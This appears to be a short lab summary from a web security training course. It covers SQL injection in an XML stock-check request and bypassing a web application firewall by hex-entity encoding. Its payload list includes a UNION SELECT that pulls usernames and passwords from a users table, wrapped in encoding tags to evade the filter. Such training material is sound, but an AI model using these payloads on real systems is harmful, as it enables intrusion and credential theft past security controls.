## SQL injection with filter bypass via XML encoding

**Category:** sqli
**Difficulty:** Unknown

### Description
This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

### Solution Steps
A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the
Hackvertor
extension to do this.

### Key Payloads
- `users`
- `productId`
- `storeId`
- `POST /product/stock`
- `<storeId>1+1</storeId>`
- `UNION SELECT`
- `<storeId>1 UNION SELECT NULL</storeId>`
- `0 units`
- `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: sqli

---
*Source: PortSwigger Web Security Academy*
